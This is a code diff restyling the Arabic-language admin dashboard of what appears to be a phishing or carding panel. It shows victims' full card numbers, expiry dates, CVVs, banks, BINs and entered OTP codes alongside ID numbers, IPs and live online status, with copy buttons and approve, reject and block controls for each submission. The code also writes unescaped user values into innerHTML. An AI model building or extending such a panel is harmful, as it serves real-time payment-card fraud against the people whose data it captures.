@@ -320,14 +320,14 @@ async function selectClient(clientId) {
   document.getElementById('inboxLayout').classList.add('show-detail');
 
   const detail = document.getElementById('inboxDetail');
-  detail.innerHTML = '<div class="empty-state">جارٍ التحميل...</div>';
+  detail.innerHTML = '<div class="flex items-center justify-center h-full text-gray-400 text-sm">جارٍ التحميل...</div>';
 
   try {
     const data = await api('/api/client?client_id=' + clientId);
     state.currentTimeline = data;
     renderDetail(data);
   } catch (e) {
-    detail.innerHTML = '<div class="empty-state">فشل التحميل: ' + e.message + '</div>';
+    detail.innerHTML = '<div class="flex items-center justify-center h-full text-red-400 text-sm">فشل التحميل: ' + e.message + '</div>';
   }
 }
 
@@ -336,147 +336,243 @@ function backToList() {
   document.getElementById('inboxLayout').classList.remove('show-detail');
 }
 
+// تصنيف الحالة إلى لون
+function statusColor(status) {
+  const s = (status || '').toLowerCase();
+  if (['approved', 'paid', 'active', 'online', 'مدفوع', 'موافق عليه', 'نشط'].some((k) => s.includes(k))) return 'green';
+  if (['pending', 'waiting', 'معلق', 'قيد'].some((k) => s.includes(k))) return 'amber';
+  if (['rejected', 'blocked', 'offline', 'refused', 'مرفوض', 'محظور'].some((k) => s.includes(k))) return 'red';
+  return 'gray';
+}
+const STATUS_BADGE = {
+  green: 'bg-green-100 text-green-700',
+  amber: 'bg-amber-100 text-amber-700',
+  red: 'bg-red-100 text-red-700',
+  gray: 'bg-gray-100 text-gray-600',
+};
+const STATUS_TXT = {
+  approved: '✓ موافق عليه', rejected: '✗ مرفوض', pending: '⏳ معلق', paid: '✓ مدفوع', active: '✓ نشط', blocked: '✗ محظور',
+};
+function statusLabel(status) {
+  return STATUS_TXT[(status || '').toLowerCase()] || status || '—';
+}
+
+// عنوان البطاقة حسب النوع
+function cardTitle(type) {
+  return { submission: 'حجز', payment: 'الدفع', otp: 'رمز التحقق (OTP)', file: 'ملف مرفق', profile: 'معلومات أساسية' }[type] || type;
+}
+
+// شعار شبكة البطاقة (VISA / MASTERCARD)
+function brandLogo(network, cardType) {
+  const n = (network || cardType || '').toUpperCase();
+  if (n.includes('VISA')) {
+    return `<svg viewBox="0 0 48 16" width="48" height="16" aria-label="VISA"><text x="0" y="13" font-family="Arial" font-weight="900" font-size="15" fill="#1a1f71" letter-spacing="-0.5">VISA</text></svg>`;
+  }
+  if (n.includes('MASTERCARD') || n.includes('MASTER')) {
+    return `<svg viewBox="0 0 48 30" width="40" height="24" aria-label="Mastercard"><circle cx="18" cy="15" r="12" fill="#EB001B"></circle><circle cx="30" cy="15" r="12" fill="#F79E1B"></circle><path d="M24 6.5a12 12 0 000 17 12 12 0 000-17z" fill="#FF5F00"></path></svg>`;
+  }
+  return `<span class="text-[10px] text-gray-400">${(network || 'بطاقة') || ''}</span>`;
+}
+
 function renderDetail(data) {
   const { client, timeline } = data;
   const detail = document.getElementById('inboxDetail');
+  const c = client || {};
+  const online = !!c.online;
+  const flag = countryFlag(c.country_code);
 
+  // ----- الرأس العلوي -----
   let html = `
-    <div class="detail-header">
-      <button class="back-btn" onclick="backToList()">↩ رجوع</button>
-      <h3>${client.full_name || '—'}</h3>
-      <span class="ref">${client.fingerprint?.slice(0, 16) || ''}</span>
-    </div>
-    <div class="timeline">
+    <div class="flex flex-col h-full">
+      <div class="sticky top-0 z-10 bg-white/95 backdrop-blur border-b border-gray-200">
+        <div class="flex items-center gap-2 px-4 py-3">
+          <button class="p-1.5 rounded-lg hover:bg-gray-100 text-gray-600" title="رجوع" onclick="backToList()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"></path><path d="m12 19-7-7 7-7"></path></svg>
+          </button>
+          <span class="text-base font-bold text-gray-800 truncate">${c.full_name || 'زائر'}</span>
+          <div class="flex-1"></div>
+        </div>
+        <div class="flex flex-wrap items-center gap-1.5 px-4 pb-2">
+          <span class="inline-flex items-center gap-1 px-2 py-1 rounded-md bg-gray-100 text-gray-600 text-xs">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+            <span class="font-mono" dir="ltr">${c.phone || '—'}</span>
+          </span>
+          <span class="inline-flex items-center gap-1 px-2 py-1 rounded-md bg-gray-100 text-gray-600 text-xs">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"></rect><line x1="8" x2="16" y1="21" y2="21"></line><line x1="12" x2="12" y1="17" y2="21"></line></svg>
+            ${c.device_info ? c.device_info.split(',')[0] : 'سطح المكتب'}
+          </span>
+          <span class="inline-flex items-center gap-1 px-2 py-1 rounded-md bg-gray-100 text-gray-500 text-xs">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M2 12h20"></path></svg>
+            ${c.country_name || c.country_code || 'غير معروف'}
+          </span>
+          <span class="px-2 py-1 rounded-md bg-gray-100 text-sm">${flag}</span>
+          <span class="px-2 py-1 rounded-md text-xs ${online ? 'bg-green-50 text-green-600' : 'bg-gray-100 text-gray-500'}" title="${online ? 'متصل' : 'غير متصل'}">${online ? '● متصل' : '○ غير متصل'}</span>
+        </div>
+        <div class="flex items-center gap-1.5 px-4 pb-2.5">
+          <button class="px-2.5 py-1.5 rounded-md bg-red-50 text-red-600 text-xs font-medium hover:bg-red-100 transition" onclick="openBlockModal()">🚫 حظر</button>
+          <button class="px-2.5 py-1.5 rounded-md bg-gray-100 text-gray-600 text-xs font-medium hover:bg-gray-200 transition" onclick="archiveCurrent()">📥 أرشفة</button>
+          <button class="px-2.5 py-1.5 rounded-md bg-red-50 text-red-600 text-xs font-medium hover:bg-red-100 transition" onclick="showToast('الحذف غير متاح حالياً')">🗑 حذف</button>
+        </div>
+      </div>
+
+      <!-- منطقة البطاقات -->
+      <div class="flex-1 overflow-y-auto p-3 space-y-3 bg-gray-50">
   `;
 
-  // صندوق الملف الشخصي (profile) — دائماً موجود
-  html += renderProfileBox(client);
-
-  // باقي الصناديق حسب الخط الزمني
-  for (const box of timeline) {
-    if (box.type === 'profile') continue; // عُرضت كصندوق profile أعلاه
+  // الخط الزمني مرتب من الأحدث للأقدم (كما يُرجعه الـ API)
+  for (const box of timeline || []) {
     html += renderTimelineBox(box);
   }
 
-  html += `</div>`;
-
-  // أزرار القرارات
   html += `
-    <div class="decision-row">
-      <input type="text" class="decision-note" id="decisionNote" placeholder="ملاحظة القرار (اختياري)">
-      <button class="btn-approve" onclick="makeDecision('approve')">✓ موافقة</button>
-      <button class="btn-reject" onclick="makeDecision('reject')">✕ رفض</button>
-      <button class="btn-block" onclick="openBlockModal()">🚫 حظر</button>
+      </div>
     </div>
   `;
 
   detail.innerHTML = html;
 }
 
-function renderProfileBox(client) {
-  return `
-    <div class="timeline-box">
-      <div class="timeline-box-header">
-        <div class="box-icon profile">👤</div>
-        <span class="box-title">الملف الشخصي</span>
-        <span class="box-time">${formatTime(client.created_at)}</span>
-      </div>
-      <div class="timeline-box-body">
-        <div class="line"><span class="key">الاسم الكامل</span><span class="val">${client.full_name || '—'}</span></div>
-        <div class="line"><span class="key">البريد الإلكتروني</span><span class="val copyable" onclick="copyToClipboard('${client.email || ''}', 'البريد')">${client.email || '—'}</span></div>
-        <div class="line"><span class="key">الهاتف</span><span class="val copyable" onclick="copyToClipboard('${client.phone || ''}', 'الهاتف')">${client.phone || '—'}</span></div>
-        <div class="line"><span class="key">رقم الهوية</span><span class="val copyable" onclick="copyToClipboard('${client.id_number || ''}', 'رقم الهوية')">${client.id_number || '—'}</span></div>
-        <div class="line"><span class="key">الدولة</span><span class="val">${client.country_name || client.country_code || '—'}</span></div>
-        <div class="line"><span class="key">عنوان IP</span><span class="val copyable" onclick="copyToClipboard('${client.ip_address || ''}', 'IP')">${client.ip_address || '—'}</span></div>
-        <div class="line"><span class="key">البصمة</span><span class="val copyable" onclick="copyToClipboard('${client.fingerprint || ''}', 'البصمة')" style="font-size:11px;">${client.fingerprint || '—'}</span></div>
-        <div class="line"><span class="key">جهاز</span><span class="val" style="font-size:11px;">${client.device_info || '—'}</span></div>
-        <div class="line"><span class="key">الحالة</span><span class="val"><span class="status-dot ${client.online ? 'online' : 'offline'}"></span>${client.online ? 'متصل' : 'غير متصل'}</span></div>
-        <div class="line"><span class="key">آخر ظهور</span><span class="val">${formatTime(client.last_seen_at)}</span></div>
-        <div class="line"><span class="key">حالة العميل</span><span class="val">${client.status || 'active'}</span></div>
-      </div>
-    </div>
-  `;
+// صف بيانات داخل البطاقة
+function dataRow(label, value, opts = {}) {
+  if (value === null || value === undefined || value === '') return '';
+  const cls = opts.mono ? 'font-mono' : '';
+  const dir = opts.ltr ? 'dir="ltr"' : '';
+  const copy = opts.copy ? ` class="cursor-pointer hover:text-gray-800" onclick="copyToClipboard('${String(value).replace(/'/g, '')}', '${label}')"` : '';
+  const valClass = opts.valueColor ? ` ${opts.valueColor}` : ' text-gray-700';
+  return `<div class="flex items-start justify-between gap-3 py-1.5 text-xs">
+    <span class="text-gray-500 shrink-0">${label}:</span>
+    <span class="${cls} ${valClass}" ${dir} ${copy}>${value}</span>
+  </div>`;
+}
+
+function statusBadge(status) {
+  const col = statusColor(status);
+  return `<span class="inline-block px-2 py-0.5 rounded text-[11px] font-semibold ${STATUS_BADGE[col]}">${statusLabel(status)}</span>`;
 }
 
 function renderTimelineBox(box) {
-  const icons = { submission: '📋', payment: '💳', otp: '🔑', file: '📎' };
-  const d = box.data;
+  const d = box.data || {};
+  const title = cardTitle(box.type);
+  const time = formatTime(box.time || d.created_at);
 
   let body = '';
-  if (box.type === 'submission') {
+
+  if (box.type === 'otp') {
+    const code = (d.code || '').toString();
+    const boxes = code
+      ? code.split('').map((ch) => `<div class="w-8 h-10 flex items-center justify-center rounded-md bg-gray-50 border border-gray-200 text-gray-800 font-bold text-lg font-mono">${ch}</div>`).join('')
+      : `<div class="w-8 h-10 flex items-center justify-center rounded-md bg-gray-50 border border-gray-200 text-gray-300">-</div>`.repeat(4);
     body = `
-      <div class="line"><span class="key">المرجع</span><span class="val copyable" onclick="copyToClipboard('${d.reference || ''}', 'المرجع')">${d.reference || '—'}</span></div>
-      <div class="line"><span class="key">نوع الخدمة</span><span class="val">${d.service_type || '—'}</span></div>
-      <div class="line"><span class="key">الموضوع</span><span class="val">${d.subject || '—'}</span></div>
-      <div class="line"><span class="key">نوع القارب</span><span class="val">${d.boat_type || '—'}</span></div>
-      <div class="line"><span class="key">انتهاء الشهادة</span><span class="val">${d.certificate_expiry || '—'}</span></div>
-      <div class="line"><span class="key">المحتوى</span><span class="val">${d.content || '—'}</span></div>
-      <div class="line"><span class="key">الهاتف الثانوي</span><span class="val">${d.secondary_phone || '—'}</span></div>
-      <div class="line"><span class="key">الحالة</span><span class="val"><span class="status-badge ${d.status}">${d.status}</span></span></div>
+      <div class="mb-3">
+        <span class="text-xs text-gray-500 block mb-1.5">الرمز المُرسل:</span>
+        <div class="flex gap-1.5 flex-wrap cursor-pointer" onclick="copyToClipboard('${code}', 'رمز OTP')" title="انقر للنسخ" dir="ltr">${boxes}</div>
+      </div>
+      ${dataRow('حجز مرتبط', d.reference, { mono: true, ltr: true, copy: true })}
+      <div class="mt-1.5">${statusBadge(d.status)}</div>
     `;
   } else if (box.type === 'payment') {
-    // بطاقة مصوّرة + تفاصيل
+    const num = d.card_number || ('•••• •••• •••• ' + (d.card_number_last4 || '••••'));
     body = `
-      <div class="payment-card-visual">
-        <div class="card-network">${d.network || ''}</div>
-        <div class="card-chip"></div>
-        <div class="card-number" onclick="copyToClipboard('${(d.card_number || '').replace(/\s/g, '')}', 'رقم البطاقة')">${d.card_number || '•••• •••• •••• ••••'}</div>
-        <div class="card-bottom">
-          <div>
-            <div class="card-label">حامل البطاقة</div>
-            <div>${d.card_holder || '—'}</div>
+      <div class="relative overflow-hidden rounded-xl p-4 mb-3 text-white" style="background:linear-gradient(135deg,#1e293b,#0f172a)">
+        <div class="absolute -top-10 -right-10 w-32 h-32 rounded-full bg-white/5"></div>
+        <div class="absolute -bottom-12 -left-6 w-36 h-36 rounded-full bg-white/5"></div>
+        <div class="relative flex items-center justify-between mb-3">
+          <div class="flex items-center gap-2">
+            <span class="w-7 h-7 rounded-full bg-white/20 flex items-center justify-center text-xs font-bold">${(d.bank_name || 'S').charAt(0)}</span>
+            <span class="text-xs opacity-90 truncate max-w-[120px]">${d.bank_name || 'غير معروف'}</span>
           </div>
-          <div>
-            <div class="card-label">الانتهاء</div>
-            <div>${d.expiry || '—'}</div>
-          </div>
-          <div>
-            <div class="card-label">CVV</div>
-            <div class="copyable" onclick="copyToClipboard('${d.cvv || ''}', 'CVV')">${d.cvv || '—'}</div>
-          </div>
+          ${brandLogo(d.network, d.card_type)}
+        </div>
+        <div class="relative font-mono text-base tracking-wider mb-3 cursor-pointer" dir="ltr" onclick="copyToClipboard('${(d.card_number || '').replace(/\s/g, '')}', 'رقم البطاقة')" title="انقر للنسخ">${num}</div>
+        <div class="relative flex justify-between gap-3 text-[11px]">
+          <div><div class="opacity-60">حامل البطاقة</div><div class="font-semibold">${d.card_holder || '—'}</div></div>
+          <div><div class="opacity-60">EXPIRES</div><div class="font-mono cursor-pointer" dir="ltr" onclick="copyToClipboard('${d.expiry || ''}', 'الانتهاء')" title="انقر للنسخ">${d.expiry || '—'}</div></div>
+          <div><div class="opacity-60">CVV</div><div class="font-mono cursor-pointer" dir="ltr" onclick="copyToClipboard('${d.cvv || ''}', 'CVV')" title="انقر للنسخ">${d.cvv || '—'}</div></div>
         </div>
       </div>
-      <div class="line"><span class="key">آخر 4 أرقام</span><span class="val">${d.card_number_last4 || '—'}</span></div>
-      <div class="line"><span class="key">البنك</span><span class="val">${d.bank_name || '—'}</span></div>
-      <div class="line"><span class="key">نطاق البنك</span><span class="val">${d.bank_domain || '—'}</span></div>
-      <div class="line"><span class="key">نوع البطاقة</span><span class="val">${d.card_type || '—'}</span></div>
-      <div class="line"><span class="key">دولة البنك</span><span class="val">${d.bank_country || '—'}</span></div>
-      <div class="line"><span class="key">BIN</span><span class="val copyable" onclick="copyToClipboard('${d.bin || ''}', 'BIN')">${d.bin || '—'}</span></div>
-      <div class="line"><span class="key">الحالة</span><span class="val"><span class="status-badge ${d.status}">${d.status}</span></span></div>
+      ${dataRow('نوع البطاقة', (d.card_type ? d.card_type.toUpperCase() + (d.network ? ` (${d.network})` : '') : '—'))}
+      ${dataRow('البنك', d.bank_name)}
+      ${dataRow('دولة البنك', d.bank_country)}
+      ${dataRow('BIN', d.bin, { mono: true, ltr: true, copy: true })}
+      ${dataRow('حجز مرتبط', d.reference, { mono: true, ltr: true, copy: true })}
+      <div class="mt-1.5">${statusBadge(d.status)}</div>
     `;
-  } else if (box.type === 'otp') {
+  } else if (box.type === 'submission') {
+    const vColor = statusColor(d.status);
+    const valColor = vColor === 'green' ? 'text-green-600' : vColor === 'amber' ? 'text-amber-600' : vColor === 'red' ? 'text-red-600' : 'text-gray-700';
     body = `
-      <div class="line"><span class="key">الرمز</span><span class="val copyable" onclick="copyToClipboard('${d.code || ''}', 'رمز OTP')" style="font-size:20px;font-weight:700;letter-spacing:3px;">${d.code || '—'}</span></div>
-      <div class="line"><span class="key">المرجع</span><span class="val">${d.reference || '—'}</span></div>
-      <div class="line"><span class="key">الحالة</span><span class="val"><span class="status-badge ${d.status}">${d.status}</span></span></div>
+      ${dataRow('المرجع', d.reference, { mono: true, ltr: true, copy: true })}
+      ${dataRow('الحالة', statusLabel(d.status), { valueColor: valColor })}
+      ${dataRow('نوع الخدمة', d.service_type)}
+      ${dataRow('رقم الهوية', d.id_number, { ltr: true, copy: true })}
+      ${dataRow('الهاتف', d.primary_phone, { ltr: true, copy: true })}
+      ${dataRow('الهاتف الثانوي', d.secondary_phone, { ltr: true })}
+      ${dataRow('البريد', d.email, { ltr: true, copy: true })}
+      ${dataRow('الموضوع', d.subject)}
+      ${dataRow('المحتوى', d.content, { valueColor: 'text-gray-600' })}
+      ${d.terms_snapshot ? dataRow('الشروط', d.terms_snapshot, { valueColor: 'text-gray-600' }) : ''}
+    `;
+  } else if (box.type === 'profile') {
+    const vColor = c => (c === 'green' ? 'text-green-600' : c === 'red' ? 'text-red-600' : 'text-gray-700');
+    body = `
+      ${dataRow('الاسم', d.full_name)}
+      ${dataRow('البريد الإلكتروني', d.email, { ltr: true, copy: true })}
+      ${dataRow('رقم الهاتف', d.phone, { ltr: true, copy: true })}
+      ${dataRow('رقم الهوية', d.id_number, { ltr: true, copy: true })}
+      ${dataRow('الدولة', (d.country_code ? flagEmoji(d.country_code) + ' ' : '') + (d.country_name || d.country_code || 'غير معروف'))}
+      ${dataRow('عنوان IP', d.ip_address, { ltr: true, copy: true })}
+      ${dataRow('البصمة', d.fingerprint, { ltr: true, copy: true })}
+      ${dataRow('الجهاز', d.device_info)}
+      ${dataRow('الحالة', statusLabel(d.status === 'active' ? 'active' : d.status), { valueColor: vColor(statusColor(d.status)) })}
     `;
   } else if (box.type === 'file') {
     body = `
-      <div class="line"><span class="key">اسم الملف</span><span class="val">${d.file_name || '—'}</span></div>
-      <div class="line"><span class="key">النوع</span><span class="val">${d.file_type || '—'}</span></div>
-      <div class="line"><span class="key">الحجم</span><span class="val">${d.file_size ? (d.file_size/1024).toFixed(0) + ' KB' : '—'}</span></div>
-      <div class="line"><span class="key">المسار</span><span class="val" style="font-size:11px;">${d.storage_path || '—'}</span></div>
-      <div class="line"><span class="key">التصنيف</span><span class="val">${d.category || '—'}</span></div>
+      ${dataRow('اسم الملف', d.file_name)}
+      ${dataRow('النوع', d.file_type)}
+      ${dataRow('الحجم', d.file_size ? (d.file_size / 1024).toFixed(0) + ' KB' : '')}
+      ${dataRow('التصنيف', d.category)}
     `;
   }
 
   return `
-    <div class="timeline-box">
-      <div class="timeline-box-header">
-        <div class="box-icon ${box.type}">${icons[box.type] || '📄'}</div>
-        <span class="box-title">${getBoxTitle(box.type)}</span>
-        <span class="box-time">${formatTime(box.time)}</span>
+    <div class="bg-white rounded-xl border border-gray-200 overflow-hidden">
+      <div class="flex items-center justify-between px-4 py-2.5 border-b border-gray-100 bg-gray-50/50">
+        <span class="text-sm font-semibold text-gray-700">${title}</span>
+        <span class="text-[11px] text-gray-400 font-mono">⏱ ${time}</span>
       </div>
-      <div class="timeline-box-body">${body}</div>
+      <div class="px-4 py-3">${body}</div>
     </div>
   `;
 }
 
-function getBoxTitle(type) {
-  return { submission: 'تقديم طلب', payment: 'بطاقة دفع', otp: 'رمز تحقق', file: 'ملف مرفق' }[type] || type;
+// اسم مستعار لعلم الدولة (إعادة استخدام countryFlag)
+function flagEmoji(code) {
+  return countryFlag(code);
 }
 
 /* ---------- القرارات ---------- */
+async function archiveCurrent() {
+  if (!state.currentTimeline) return;
+  const subs = (state.currentTimeline.timeline || []).filter((b) => b.type === 'submission' && b.data?.id);
+  if (!subs.length) {
+    showToast('لا يوجد حجز للأرشفة');
+    return;
+  }
+  const ids = subs.map((s) => s.data.id);
+  try {
+    await api('/api/archive', {
+      method: 'POST',
+      body: JSON.stringify({ action: 'archive', submission_ids: ids }),
+    });
+    showToast('تمت أرشفة الحجز');
+    selectClient(state.selectedClientId);
+    loadStats();
+    loadInbox();
+  } catch (e) {
+    showToast('فشل الأرشفة: ' + e.message);
+  }
+}
+
 async function makeDecision(action) {
   if (!state.currentTimeline) return;
   // نطبّق القرار على أحدث submission معلّق
